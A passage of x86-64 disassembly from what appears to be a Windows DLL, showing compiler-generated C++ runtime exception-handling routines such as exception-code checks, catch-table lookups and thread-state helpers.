   18000330a:	8b e8                	mov    %eax,%ebp
   18000330c:	4c 89 16             	mov    %r10,(%rsi)
   18000330f:	85 ff                	test   %edi,%edi
   180003311:	74 74                	je     0x180003387
   180003313:	49 63 46 10          	movslq 0x10(%r14),%rax
   180003317:	ff cf                	dec    %edi
   180003319:	48 8d 14 bf          	lea    (%rdi,%rdi,4),%rdx
   18000331d:	48 8d 1c 90          	lea    (%rax,%rdx,4),%rbx
   180003321:	49 03 5f 08          	add    0x8(%r15),%rbx
   180003325:	3b 6b 04             	cmp    0x4(%rbx),%ebp
   180003328:	7e e5                	jle    0x18000330f
   18000332a:	3b 6b 08             	cmp    0x8(%rbx),%ebp
   18000332d:	7f e0                	jg     0x18000330f
   18000332f:	49 8b 0f             	mov    (%r15),%rcx
   180003332:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003337:	45 33 c0             	xor    %r8d,%r8d
   18000333a:	ff 15 30 4d 01 00    	call   *0x14d30(%rip)        # 0x180018070
   180003340:	4c 63 43 10          	movslq 0x10(%rbx),%r8
   180003344:	33 c9                	xor    %ecx,%ecx
   180003346:	4c 03 44 24 50       	add    0x50(%rsp),%r8
   18000334b:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   18000334f:	44 8b 10             	mov    (%rax),%r10d
   180003352:	45 85 c9             	test   %r9d,%r9d
   180003355:	74 17                	je     0x18000336e
   180003357:	49 8d 50 0c          	lea    0xc(%r8),%rdx
   18000335b:	48 63 02             	movslq (%rdx),%rax
   18000335e:	49 3b c2             	cmp    %r10,%rax
   180003361:	74 10                	je     0x180003373
   180003363:	ff c1                	inc    %ecx
   180003365:	48 83 c2 14          	add    $0x14,%rdx
   180003369:	41 3b c9             	cmp    %r9d,%ecx
   18000336c:	72 ed                	jb     0x18000335b
   18000336e:	41 3b c9             	cmp    %r9d,%ecx
   180003371:	73 9c                	jae    0x18000330f
   180003373:	49 8b 04 24          	mov    (%r12),%rax
   180003377:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   18000337b:	49 63 4c 88 10       	movslq 0x10(%r8,%rcx,4),%rcx
   180003380:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   180003384:	48 89 0e             	mov    %rcx,(%rsi)
   180003387:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   18000338c:	48 8b c6             	mov    %rsi,%rax
   18000338f:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   180003394:	48 83 c4 20          	add    $0x20,%rsp
   180003398:	41 5f                	pop    %r15
   18000339a:	41 5e                	pop    %r14
   18000339c:	41 5c                	pop    %r12
   18000339e:	5f                   	pop    %rdi
   18000339f:	5e                   	pop    %rsi
   1800033a0:	c3                   	ret
   1800033a1:	cc                   	int3
   1800033a2:	cc                   	int3
   1800033a3:	cc                   	int3
   1800033a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800033a9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800033ae:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800033b3:	57                   	push   %rdi
   1800033b4:	41 54                	push   %r12
   1800033b6:	41 55                	push   %r13
   1800033b8:	41 56                	push   %r14
   1800033ba:	41 57                	push   %r15
   1800033bc:	48 83 ec 40          	sub    $0x40,%rsp
   1800033c0:	48 8b 9c 24 90 00 00 	mov    0x90(%rsp),%rbx
   1800033c7:	00 
   1800033c8:	4c 8b e2             	mov    %rdx,%r12
   1800033cb:	48 8b e9             	mov    %rcx,%rbp
   1800033ce:	49 8b d1             	mov    %r9,%rdx
   1800033d1:	48 8b cb             	mov    %rbx,%rcx
   1800033d4:	49 8b f9             	mov    %r9,%rdi
   1800033d7:	45 8b f8             	mov    %r8d,%r15d
   1800033da:	44 8b 73 0c          	mov    0xc(%rbx),%r14d
   1800033de:	e8 05 0d 00 00       	call   0x1800040e8
   1800033e3:	45 33 d2             	xor    %r10d,%r10d
   1800033e6:	8b f0                	mov    %eax,%esi
   1800033e8:	45 85 f6             	test   %r14d,%r14d
   1800033eb:	0f 84 ec 00 00 00    	je     0x1800034dd
   1800033f1:	4c 8b 47 08          	mov    0x8(%rdi),%r8
   1800033f5:	83 c8 ff             	or     $0xffffffff,%eax
   1800033f8:	4c 63 5b 10          	movslq 0x10(%rbx),%r11
   1800033fc:	44 8b c8             	mov    %eax,%r9d
   1800033ff:	44 8b e8             	mov    %eax,%r13d
   180003402:	41 8b d6             	mov    %r14d,%edx
   180003405:	8d 5a ff             	lea    -0x1(%rdx),%ebx
   180003408:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   18000340c:	49 8d 04 88          	lea    (%r8,%rcx,4),%rax
   180003410:	42 3b 74 18 04       	cmp    0x4(%rax,%r11,1),%esi
   180003415:	7e 07                	jle    0x18000341e
   180003417:	42 3b 74 18 08       	cmp    0x8(%rax,%r11,1),%esi
   18000341c:	7e 0c                	jle    0x18000342a
   18000341e:	8b d3                	mov    %ebx,%edx
   180003420:	8b c3                	mov    %ebx,%eax
   180003422:	85 db                	test   %ebx,%ebx
   180003424:	75 df                	jne    0x180003405
   180003426:	85 c0                	test   %eax,%eax
   180003428:	74 10                	je     0x18000343a
   18000342a:	8d 42 ff             	lea    -0x1(%rdx),%eax
   18000342d:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   180003431:	49 8d 14 83          	lea    (%r11,%rax,4),%rdx
   180003435:	49 03 d0             	add    %r8,%rdx
   180003438:	eb 03                	jmp    0x18000343d
   18000343a:	49 8b d2             	mov    %r10,%rdx
   18000343d:	4b 8d 0c 18          	lea    (%r8,%r11,1),%rcx
   180003441:	45 8b c2             	mov    %r10d,%r8d
   180003444:	41 83 cb ff          	or     $0xffffffff,%r11d
   180003448:	48 85 d2             	test   %rdx,%rdx
   18000344b:	74 0f                	je     0x18000345c
   18000344d:	8b 42 04             	mov    0x4(%rdx),%eax
   180003450:	39 01                	cmp    %eax,(%rcx)
   180003452:	7e 23                	jle    0x180003477
   180003454:	8b 42 08             	mov    0x8(%rdx),%eax
   180003457:	39 41 04             	cmp    %eax,0x4(%rcx)
   18000345a:	7f 1b                	jg     0x180003477
   18000345c:	44 3b 39             	cmp    (%rcx),%r15d
   18000345f:	7c 16                	jl     0x180003477
   180003461:	44 3b 79 04          	cmp    0x4(%rcx),%r15d
   180003465:	7f 10                	jg     0x180003477
   180003467:	45 3b cb             	cmp    %r11d,%r9d
   18000346a:	41 8b c0             	mov    %r8d,%eax
   18000346d:	45 8b e8             	mov    %r8d,%r13d
   180003470:	41 0f 45 c1          	cmovne %r9d,%eax
   180003474:	44 8b c8             	mov    %eax,%r9d
   180003477:	41 ff c0             	inc    %r8d
   18000347a:	48 83 c1 14          	add    $0x14,%rcx
   18000347e:	45 3b c6             	cmp    %r14d,%r8d
   180003481:	72 c5                	jb     0x180003448
   180003483:	45 3b cb             	cmp    %r11d,%r9d
   180003486:	4c 89 64 24 20       	mov    %r12,0x20(%rsp)
   18000348b:	41 8b c2             	mov    %r10d,%eax
   18000348e:	4c 89 64 24 30       	mov    %r12,0x30(%rsp)
   180003493:	41 0f 45 c1          	cmovne %r9d,%eax
   180003497:	4c 8d 5c 24 40       	lea    0x40(%rsp),%r11
   18000349c:	49 8b 5b 30          	mov    0x30(%r11),%rbx
   1800034a0:	49 8b 73 40          	mov    0x40(%r11),%rsi
   1800034a4:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1800034a8:	41 8d 45 01          	lea    0x1(%r13),%eax
   1800034ac:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   1800034b1:	44 0f 45 d0          	cmovne %eax,%r10d
   1800034b5:	48 8b c5             	mov    %rbp,%rax
   1800034b8:	44 89 54 24 38       	mov    %r10d,0x38(%rsp)
   1800034bd:	0f 10 4c 24 30       	movups 0x30(%rsp),%xmm1
   1800034c2:	f3 0f 7f 45 00       	movdqu %xmm0,0x0(%rbp)
   1800034c7:	f3 0f 7f 4d 10       	movdqu %xmm1,0x10(%rbp)
   1800034cc:	49 8b 6b 38          	mov    0x38(%r11),%rbp
   1800034d0:	49 8b e3             	mov    %r11,%rsp
   1800034d3:	41 5f                	pop    %r15
   1800034d5:	41 5e                	pop    %r14
   1800034d7:	41 5d                	pop    %r13
   1800034d9:	41 5c                	pop    %r12
   1800034db:	5f                   	pop    %rdi
   1800034dc:	c3                   	ret
   1800034dd:	e8 12 89 00 00       	call   0x18000bdf4
   1800034e2:	cc                   	int3
   1800034e3:	cc                   	int3
   1800034e4:	40 55                	rex push %rbp
   1800034e6:	48 8d 6c 24 e1       	lea    -0x1f(%rsp),%rbp
   1800034eb:	48 81 ec e0 00 00 00 	sub    $0xe0,%rsp
   1800034f2:	48 8b 05 17 fb 01 00 	mov    0x1fb17(%rip),%rax        # 0x180023010
   1800034f9:	48 33 c4             	xor    %rsp,%rax
   1800034fc:	48 89 45 0f          	mov    %rax,0xf(%rbp)
   180003500:	4c 8b 55 77          	mov    0x77(%rbp),%r10
   180003504:	48 8d 05 05 4f 01 00 	lea    0x14f05(%rip),%rax        # 0x180018410
   18000350b:	0f 10 00             	movups (%rax),%xmm0
   18000350e:	4c 8b d9             	mov    %rcx,%r11
   180003511:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   180003516:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   18000351a:	0f 11 01             	movups %xmm0,(%rcx)
   18000351d:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   180003521:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180003525:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180003529:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   18000352d:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180003531:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   180003535:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180003539:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   18000353d:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180003541:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   180003545:	0f 10 88 80 00 00 00 	movups 0x80(%rax),%xmm1
   18000354c:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   180003550:	0f 10 40 70          	movups 0x70(%rax),%xmm0
   180003554:	48 8b 80 90 00 00 00 	mov    0x90(%rax),%rax
   18000355b:	0f 11 41 70          	movups %xmm0,0x70(%rcx)
   18000355f:	0f 11 89 80 00 00 00 	movups %xmm1,0x80(%rcx)
   180003566:	48 89 81 90 00 00 00 	mov    %rax,0x90(%rcx)
   18000356d:	48 8d 05 54 1a 00 00 	lea    0x1a54(%rip),%rax        # 0x180004fc8
   180003574:	49 8b 0b             	mov    (%r11),%rcx
   180003577:	48 89 45 8f          	mov    %rax,-0x71(%rbp)
   18000357b:	48 8b 45 4f          	mov    0x4f(%rbp),%rax
   18000357f:	48 89 45 9f          	mov    %rax,-0x61(%rbp)
   180003583:	48 63 45 5f          	movslq 0x5f(%rbp),%rax
   180003587:	48 89 45 a7          	mov    %rax,-0x59(%rbp)
   18000358b:	48 8b 45 57          	mov    0x57(%rbp),%rax
   18000358f:	48 89 45 b7          	mov    %rax,-0x49(%rbp)
   180003593:	0f b6 45 7f          	movzbl 0x7f(%rbp),%eax
   180003597:	48 89 45 c7          	mov    %rax,-0x39(%rbp)
   18000359b:	49 8b 42 40          	mov    0x40(%r10),%rax
   18000359f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1800035a4:	49 8b 42 28          	mov    0x28(%r10),%rax
   1800035a8:	4c 89 4d 97          	mov    %r9,-0x69(%rbp)
   1800035ac:	45 33 c9             	xor    %r9d,%r9d
   1800035af:	4c 89 45 af          	mov    %r8,-0x51(%rbp)
   1800035b3:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1800035b8:	48 89 55 bf          	mov    %rdx,-0x41(%rbp)
   1800035bc:	49 8b 12             	mov    (%r10),%rdx
   1800035bf:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1800035c4:	48 c7 45 cf 20 05 93 	movq   $0x19930520,-0x31(%rbp)
   1800035cb:	19 
   1800035cc:	ff 15 16 4b 01 00    	call   *0x14b16(%rip)        # 0x1800180e8
   1800035d2:	48 8b 4d 0f          	mov    0xf(%rbp),%rcx
   1800035d6:	48 33 cc             	xor    %rsp,%rcx
   1800035d9:	e8 02 ed ff ff       	call   0x1800022e0
   1800035de:	48 81 c4 e0 00 00 00 	add    $0xe0,%rsp
   1800035e5:	5d                   	pop    %rbp
   1800035e6:	c3                   	ret
   1800035e7:	cc                   	int3
   1800035e8:	40 53                	rex push %rbx
   1800035ea:	48 83 ec 20          	sub    $0x20,%rsp
   1800035ee:	48 8b d9             	mov    %rcx,%rbx
   1800035f1:	48 89 11             	mov    %rdx,(%rcx)
   1800035f4:	e8 0b 09 00 00       	call   0x180003f04
   1800035f9:	48 3b 58 58          	cmp    0x58(%rax),%rbx
   1800035fd:	73 0b                	jae    0x18000360a
   1800035ff:	e8 00 09 00 00       	call   0x180003f04
   180003604:	48 8b 48 58          	mov    0x58(%rax),%rcx
   180003608:	eb 02                	jmp    0x18000360c
   18000360a:	33 c9                	xor    %ecx,%ecx
   18000360c:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   180003610:	e8 ef 08 00 00       	call   0x180003f04
   180003615:	48 89 58 58          	mov    %rbx,0x58(%rax)
   180003619:	48 8b c3             	mov    %rbx,%rax
   18000361c:	48 83 c4 20          	add    $0x20,%rsp
   180003620:	5b                   	pop    %rbx
   180003621:	c3                   	ret
   180003622:	cc                   	int3
   180003623:	cc                   	int3
   180003624:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003629:	57                   	push   %rdi
   18000362a:	48 83 ec 20          	sub    $0x20,%rsp
   18000362e:	48 8b f9             	mov    %rcx,%rdi
   180003631:	e8 ce 08 00 00       	call   0x180003f04
   180003636:	48 3b 78 58          	cmp    0x58(%rax),%rdi
   18000363a:	75 35                	jne    0x180003671
   18000363c:	e8 c3 08 00 00       	call   0x180003f04
   180003641:	48 8b 50 58          	mov    0x58(%rax),%rdx
   180003645:	48 85 d2             	test   %rdx,%rdx
   180003648:	74 27                	je     0x180003671
   18000364a:	48 8b 5a 08          	mov    0x8(%rdx),%rbx
   18000364e:	48 3b fa             	cmp    %rdx,%rdi
   180003651:	74 0a                	je     0x18000365d
   180003653:	48 8b d3             	mov    %rbx,%rdx
   180003656:	48 85 db             	test   %rbx,%rbx
   180003659:	74 16                	je     0x180003671
   18000365b:	eb ed                	jmp    0x18000364a
   18000365d:	e8 a2 08 00 00       	call   0x180003f04
   180003662:	48 89 58 58          	mov    %rbx,0x58(%rax)
   180003666:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000366b:	48 83 c4 20          	add    $0x20,%rsp
   18000366f:	5f                   	pop    %rdi
   180003670:	c3                   	ret
   180003671:	e8 7e 87 00 00       	call   0x18000bdf4
   180003676:	cc                   	int3
   180003677:	cc                   	int3
   180003678:	48 83 ec 28          	sub    $0x28,%rsp
   18000367c:	e8 83 08 00 00       	call   0x180003f04
   180003681:	48 8b 40 60          	mov    0x60(%rax),%rax
   180003685:	48 83 c4 28          	add    $0x28,%rsp
   180003689:	c3                   	ret
   18000368a:	cc                   	int3
   18000368b:	cc                   	int3
   18000368c:	48 83 ec 28          	sub    $0x28,%rsp
   180003690:	e8 6f 08 00 00       	call   0x180003f04
   180003695:	48 8b 40 68          	mov    0x68(%rax),%rax
   180003699:	48 83 c4 28          	add    $0x28,%rsp
   18000369d:	c3                   	ret
   18000369e:	cc                   	int3
   18000369f:	cc                   	int3
   1800036a0:	40 53                	rex push %rbx
   1800036a2:	48 83 ec 20          	sub    $0x20,%rsp
   1800036a6:	48 8b d9             	mov    %rcx,%rbx
   1800036a9:	e8 56 08 00 00       	call   0x180003f04
   1800036ae:	48 89 58 60          	mov    %rbx,0x60(%rax)
   1800036b2:	48 83 c4 20          	add    $0x20,%rsp
   1800036b6:	5b                   	pop    %rbx
   1800036b7:	c3                   	ret
   1800036b8:	40 53                	rex push %rbx
   1800036ba:	48 83 ec 20          	sub    $0x20,%rsp
   1800036be:	48 8b d9             	mov    %rcx,%rbx
   1800036c1:	e8 3e 08 00 00       	call   0x180003f04
   1800036c6:	48 89 58 68          	mov    %rbx,0x68(%rax)
   1800036ca:	48 83 c4 20          	add    $0x20,%rsp
   1800036ce:	5b                   	pop    %rbx
   1800036cf:	c3                   	ret
   1800036d0:	48 8b c4             	mov    %rsp,%rax
   1800036d3:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1800036d7:	48 89 68 18          	mov    %rbp,0x18(%rax)
   1800036db:	48 89 70 20          	mov    %rsi,0x20(%rax)
   1800036df:	57                   	push   %rdi
   1800036e0:	48 83 ec 40          	sub    $0x40,%rsp
   1800036e4:	49 8b 59 08          	mov    0x8(%r9),%rbx
   1800036e8:	49 8b f9             	mov    %r9,%rdi
   1800036eb:	49 8b f0             	mov    %r8,%rsi
   1800036ee:	48 89 50 08          	mov    %rdx,0x8(%rax)
   1800036f2:	48 8b e9             	mov    %rcx,%rbp
   1800036f5:	e8 0a 08 00 00       	call   0x180003f04
   1800036fa:	48 89 58 60          	mov    %rbx,0x60(%rax)
   1800036fe:	48 8b 5d 38          	mov    0x38(%rbp),%rbx
   180003702:	e8 fd 07 00 00       	call   0x180003f04
   180003707:	48 89 58 68          	mov    %rbx,0x68(%rax)
   18000370b:	e8 f4 07 00 00       	call   0x180003f04
   180003710:	48 8b 57 38          	mov    0x38(%rdi),%rdx
   180003714:	4c 8b cf             	mov    %rdi,%r9
   180003717:	4c 8b c6             	mov    %rsi,%r8
   18000371a:	8b 0a                	mov    (%rdx),%ecx
   18000371c:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180003721:	48 03 48 60          	add    0x60(%rax),%rcx
   180003725:	33 c0                	xor    %eax,%eax
   180003727:	88 44 24 38          	mov    %al,0x38(%rsp)
   18000372b:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180003730:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180003734:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   180003739:	48 8b cd             	mov    %rbp,%rcx
   18000373c:	e8 f3 15 00 00       	call   0x180004d34
   180003741:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   180003746:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   18000374b:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   180003750:	48 83 c4 40          	add    $0x40,%rsp
   180003754:	5f                   	pop    %rdi
   180003755:	c3                   	ret
   180003756:	cc                   	int3
   180003757:	cc                   	int3
   180003758:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   18000375d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180003762:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180003767:	41 56                	push   %r14
   180003769:	48 83 ec 20          	sub    $0x20,%rsp
   18000376d:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   180003771:	4c 8b f2             	mov    %rdx,%r14
   180003774:	48 8b f1             	mov    %rcx,%rsi
   180003777:	74 4c                	je     0x1800037c5
   180003779:	48 8b 01             	mov    (%rcx),%rax
   18000377c:	48 85 c0             	test   %rax,%rax
   18000377f:	74 44                	je     0x1800037c5
   180003781:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   180003785:	48 ff c7             	inc    %rdi
   180003788:	80 3c 38 00          	cmpb   $0x0,(%rax,%rdi,1)
   18000378c:	75 f7                	jne    0x180003785
   18000378e:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
   180003792:	e8 75 75 00 00       	call   0x18000ad0c
   180003797:	48 8b d8             	mov    %rax,%rbx
   18000379a:	48 85 c0             	test   %rax,%rax
   18000379d:	74 1c                	je     0x1800037bb
   18000379f:	4c 8b 06             	mov    (%rsi),%r8
   1800037a2:	48 8d 57 01          	lea    0x1(%rdi),%rdx
   1800037a6:	48 8b c8             	mov    %rax,%rcx
   1800037a9:	e8 9e 86 00 00       	call   0x18000be4c
   1800037ae:	48 8b c3             	mov    %rbx,%rax
   1800037b1:	41 c6 46 08 01       	movb   $0x1,0x8(%r14)
   1800037b6:	49 89 06             	mov    %rax,(%r14)
   1800037b9:	33 db                	xor    %ebx,%ebx
   1800037bb:	48 8b cb             	mov    %rbx,%rcx
   1800037be:	e8 f1 85 00 00       	call   0x18000bdb4
   1800037c3:	eb 0a                	jmp    0x1800037cf
   1800037c5:	48 8b 01             	mov    (%rcx),%rax
   1800037c8:	48 89 02             	mov    %rax,(%rdx)
   1800037cb:	c6 42 08 00          	movb   $0x0,0x8(%rdx)
   1800037cf:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800037d4:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800037d9:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   1800037de:	48 83 c4 20          	add    $0x20,%rsp
   1800037e2:	41 5e                	pop    %r14
   1800037e4:	c3                   	ret
   1800037e5:	cc                   	int3
   1800037e6:	cc                   	int3
   1800037e7:	cc                   	int3
   1800037e8:	40 53                	rex push %rbx
   1800037ea:	48 83 ec 20          	sub    $0x20,%rsp
   1800037ee:	80 79 08 00          	cmpb   $0x0,0x8(%rcx)
   1800037f2:	48 8b d9             	mov    %rcx,%rbx
   1800037f5:	74 08                	je     0x1800037ff
   1800037f7:	48 8b 09             	mov    (%rcx),%rcx
   1800037fa:	e8 b5 85 00 00       	call   0x18000bdb4
   1800037ff:	48 83 23 00          	andq   $0x0,(%rbx)
   180003803:	c6 43 08 00          	movb   $0x0,0x8(%rbx)
   180003807:	48 83 c4 20          	add    $0x20,%rsp
   18000380b:	5b                   	pop    %rbx
   18000380c:	c3                   	ret
   18000380d:	cc                   	int3
   18000380e:	cc                   	int3
   18000380f:	cc                   	int3
   180003810:	48 85 c9             	test   %rcx,%rcx
   180003813:	74 67                	je     0x18000387c
   180003815:	88 54 24 10          	mov    %dl,0x10(%rsp)
   180003819:	48 83 ec 48          	sub    $0x48,%rsp
   18000381d:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   180003823:	75 53                	jne    0x180003878
   180003825:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   180003829:	75 4d                	jne    0x180003878
   18000382b:	8b 41 20             	mov    0x20(%rcx),%eax
   18000382e:	2d 20 05 93 19       	sub    $0x19930520,%eax
   180003833:	83 f8 02             	cmp    $0x2,%eax
   180003836:	77 40                	ja     0x180003878
   180003838:	48 8b 41 30          	mov    0x30(%rcx),%rax
   18000383c:	48 85 c0             	test   %rax,%rax
   18000383f:	74 37                	je     0x180003878
   180003841:	48 63 50 04          	movslq 0x4(%rax),%rdx
   180003845:	85 d2                	test   %edx,%edx
   180003847:	74 11                	je     0x18000385a
   180003849:	48 03 51 38          	add    0x38(%rcx),%rdx
   18000384d:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   180003851:	e8 2a 00 00 00       	call   0x180003880
   180003856:	eb 20                	jmp    0x180003878
   180003858:	eb 1e                	jmp    0x180003878
   18000385a:	f6 00 10             	testb  $0x10,(%rax)
   18000385d:	74 19                	je     0x180003878
   18000385f:	48 8b 41 28          	mov    0x28(%rcx),%rax
   180003863:	48 8b 08             	mov    (%rax),%rcx
   180003866:	48 85 c9             	test   %rcx,%rcx
   180003869:	74 0d                	je     0x180003878
   18000386b:	48 8b 01             	mov    (%rcx),%rax
   18000386e:	48 8b 40 10          	mov    0x10(%rax),%rax
   180003872:	ff 15 38 4a 01 00    	call   *0x14a38(%rip)        # 0x1800182b0
   180003878:	48 83 c4 48          	add    $0x48,%rsp
   18000387c:	c3                   	ret
   18000387d:	cc                   	int3
   18000387e:	cc                   	int3
   18000387f:	cc                   	int3
   180003880:	48 ff e2             	rex.W jmp *%rdx
   180003883:	cc                   	int3
   180003884:	40 53                	rex push %rbx
   180003886:	48 83 ec 20          	sub    $0x20,%rsp
   18000388a:	48 8b d9             	mov    %rcx,%rbx
   18000388d:	e8 72 06 00 00       	call   0x180003f04
   180003892:	48 8b 50 58          	mov    0x58(%rax),%rdx
   180003896:	eb 09                	jmp    0x1800038a1
   180003898:	48 39 1a             	cmp    %rbx,(%rdx)
   18000389b:	74 12                	je     0x1800038af
   18000389d:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   1800038a1:	48 85 d2             	test   %rdx,%rdx
   1800038a4:	75 f2                	jne    0x180003898
   1800038a6:	8d 42 01             	lea    0x1(%rdx),%eax
   1800038a9:	48 83 c4 20          	add    $0x20,%rsp
   1800038ad:	5b                   	pop    %rbx
   1800038ae:	c3                   	ret
   1800038af:	33 c0                	xor    %eax,%eax
   1800038b1:	eb f6                	jmp    0x1800038a9
   1800038b3:	cc                   	int3
   1800038b4:	48 63 02             	movslq (%rdx),%rax
   1800038b7:	48 03 c1             	add    %rcx,%rax
   1800038ba:	83 7a 04 00          	cmpl   $0x0,0x4(%rdx)
   1800038be:	7c 16                	jl     0x1800038d6
   1800038c0:	4c 63 4a 04          	movslq 0x4(%rdx),%r9
   1800038c4:	48 63 52 08          	movslq 0x8(%rdx),%rdx
   1800038c8:	49 8b 0c 09          	mov    (%r9,%rcx,1),%rcx
   1800038cc:	4c 63 04 0a          	movslq (%rdx,%rcx,1),%r8
   1800038d0:	4d 03 c1             	add    %r9,%r8
   1800038d3:	49 03 c0             	add    %r8,%rax
   1800038d6:	c3                   	ret
   1800038d7:	cc                   	int3
   1800038d8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800038dd:	57                   	push   %rdi
   1800038de:	48 83 ec 20          	sub    $0x20,%rsp
   1800038e2:	48 8b 39             	mov    (%rcx),%rdi
   1800038e5:	48 8b d9             	mov    %rcx,%rbx
   1800038e8:	81 3f 52 43 43 e0    	cmpl   $0xe0434352,(%rdi)
   1800038ee:	74 12                	je     0x180003902
   1800038f0:	81 3f 4d 4f 43 e0    	cmpl   $0xe0434f4d,(%rdi)
   1800038f6:	74 0a                	je     0x180003902
   1800038f8:	81 3f 63 73 6d e0    	cmpl   $0xe06d7363,(%rdi)
   1800038fe:	74 22                	je     0x180003922
   180003900:	eb 13                	jmp    0x180003915
   180003902:	e8 fd 05 00 00       	call   0x180003f04
   180003907:	83 78 30 00          	cmpl   $0x0,0x30(%rax)
   18000390b:	7e 08                	jle    0x180003915
   18000390d:	e8 f2 05 00 00       	call   0x180003f04
   180003912:	ff 48 30             	decl   0x30(%rax)
   180003915:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000391a:	33 c0                	xor    %eax,%eax
   18000391c:	48 83 c4 20          	add    $0x20,%rsp
   180003920:	5f                   	pop    %rdi
   180003921:	c3                   	ret
   180003922:	e8 dd 05 00 00       	call   0x180003f04
   180003927:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000392b:	48 8b 5b 08          	mov    0x8(%rbx),%rbx
   18000392f:	e8 d0 05 00 00       	call   0x180003f04
   180003934:	48 89 58 28          	mov    %rbx,0x28(%rax)
   180003938:	e8 8b 84 00 00       	call   0x18000bdc8
   18000393d:	cc                   	int3
   18000393e:	cc                   	int3
   18000393f:	cc                   	int3
   180003940:	48 83 ec 28          	sub    $0x28,%rsp
   180003944:	e8 7f 84 00 00       	call   0x18000bdc8
   180003949:	cc                   	int3
   18000394a:	cc                   	int3
   18000394b:	cc                   	int3
   18000394c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180003951:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180003956:	57                   	push   %rdi
   180003957:	48 83 ec 50          	sub    $0x50,%rsp
   18000395b:	48 8b da             	mov    %rdx,%rbx
   18000395e:	48 8b f1             	mov    %rcx,%rsi
   180003961:	bf 20 05 93 19       	mov    $0x19930520,%edi
   180003966:	48 85 d2             	test   %rdx,%rdx
   180003969:	74 1d                	je     0x180003988
   18000396b:	f6 02 10             	testb  $0x10,(%rdx)
   18000396e:	74 18                	je     0x180003988
   180003970:	48 8b 09             	mov    (%rcx),%rcx
   180003973:	48 83 e9 08          	sub    $0x8,%rcx
   180003977:	48 8b 01             	mov    (%rcx),%rax
   18000397a:	48 8b 58 30          	mov    0x30(%rax),%rbx
   18000397e:	48 8b 40 40          	mov    0x40(%rax),%rax
   180003982:	ff 15 28 49 01 00    	call   *0x14928(%rip)        # 0x1800182b0
   180003988:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   18000398d:	48 8b cb             	mov    %rbx,%rcx
   180003990:	ff 15 5a 47 01 00    	call   *0x1475a(%rip)        # 0x1800180f0
   180003996:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000399b:	48 85 db             	test   %rbx,%rbx
   18000399e:	74 0f                	je     0x1800039af
   1800039a0:	f6 03 08             	testb  $0x8,(%rbx)
   1800039a3:	75 05                	jne    0x1800039aa
   1800039a5:	48 85 c0             	test   %rax,%rax
   1800039a8:	75 05                	jne    0x1800039af
   1800039aa:	bf 00 40 99 01       	mov    $0x1994000,%edi
   1800039af:	ba 01 00 00 00       	mov    $0x1,%edx
   1800039b4:	48 89 7c 24 28       	mov    %rdi,0x28(%rsp)
   1800039b9:	4c 8d 4c 24 28       	lea    0x28(%rsp),%r9
   1800039be:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   1800039c3:	b9 63 73 6d e0       	mov    $0xe06d7363,%ecx
   1800039c8:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   1800039cd:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1800039d2:	44 8d 42 03          	lea    0x3(%rdx),%r8d
   1800039d6:	ff 15 1c 47 01 00    	call   *0x1471c(%rip)        # 0x1800180f8
